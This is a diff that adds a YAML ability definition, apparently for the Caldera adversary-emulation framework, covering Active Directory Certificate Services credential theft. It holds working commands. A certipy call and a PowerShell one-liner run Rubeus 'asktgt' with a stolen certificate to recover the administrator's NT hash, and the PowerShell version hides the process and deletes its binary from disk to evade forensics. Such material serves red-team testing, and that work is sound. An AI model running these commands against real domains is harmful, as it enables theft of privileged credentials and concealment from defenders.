@@ -1,0 +1,35 @@
+- id: 991863ce-f186-421f-ad22-4980bc3ab243
+  name: 'ADCS: Authenticate with Certificate (UnPAC-the-Hash)'
+  description: |
+    Use an issued certificate (esc.cert.pfx from any ESC branch) to authenticate via Kerberos PKINIT and recover the target account NT hash (UnPAC-the-Hash). Runs once per esc.cert.pfx fact from any ESC branch, on either platform.
+
+    Windows executor: Rubeus.exe is delivered via the Caldera payload system. The executor reads the bytes, immediately deletes the delivered file, writes to a random temp path, and runs Rubeus as a child process via [Diagnostics.Process]::Start() with stdout/stderr redirected. The temp binary is deleted after the process exits.
+
+    Linux: certipy auth -no-save. The shared esc_auth parser reads both certipy and Rubeus output, normalizing the NT hash to lowercase so domain.user.ntlm is identical on both platforms.
+  tactic: credential-access
+  technique:
+    attack_id: T1649
+    name: Steal or Forge Authentication Certificates
+  platforms:
+    linux:
+      sh:
+        command: |
+          certipy auth -pfx '#{esc.cert.pfx}' -dc-ip #{esc.domain.dc_ip} -no-save 2>&1
+        timeout: 300
+        parsers:
+          plugins.stockpile.app.parsers.esc_auth:
+          - source: domain.user.name
+            edge: has_hash
+            target: domain.user.ntlm
+    windows:
+      psh:
+        command: |
+          $cwd=[IO.Directory]::GetCurrentDirectory(); $cp=Join-Path $cwd 'Rubeus.exe'; $cb=[IO.File]::ReadAllBytes($cp); Remove-Item $cp -Force -EA SilentlyContinue; $bf=[IO.Path]::GetTempFileName(); [IO.File]::WriteAllBytes($bf,$cb); $cb=$null; $tf=[IO.Path]::GetTempFileName(); $j=Start-Job -ScriptBlock {param([string]$bfile,[string[]]$a,[string]$tfile) $psi=New-Object Diagnostics.ProcessStartInfo($bfile,($a -join ' ')); $psi.RedirectStandardOutput=$true; $psi.RedirectStandardError=$true; $psi.UseShellExecute=$false; $psi.CreateNoWindow=$true; $proc=[Diagnostics.Process]::Start($psi); $stdout=$proc.StandardOutput.ReadToEnd(); $proc.WaitForExit(); Remove-Item $bfile -Force -EA SilentlyContinue; [IO.File]::WriteAllText($tfile,$stdout)} -ArgumentList $bf,@('asktgt','/user:administrator','/certificate:#{esc.cert.pfx}','/getcredentials','/nowrap'),$tf; Wait-Job $j|Out-Null; Remove-Job $j; Remove-Item $bf -Force -EA SilentlyContinue; $out=[IO.File]::ReadAllText($tf); Remove-Item $tf -Force; $out
+        timeout: 300
+        parsers:
+          plugins.stockpile.app.parsers.esc_auth:
+          - source: domain.user.name
+            edge: has_hash
+            target: domain.user.ntlm
+        payloads:
+        - Rubeus.exe
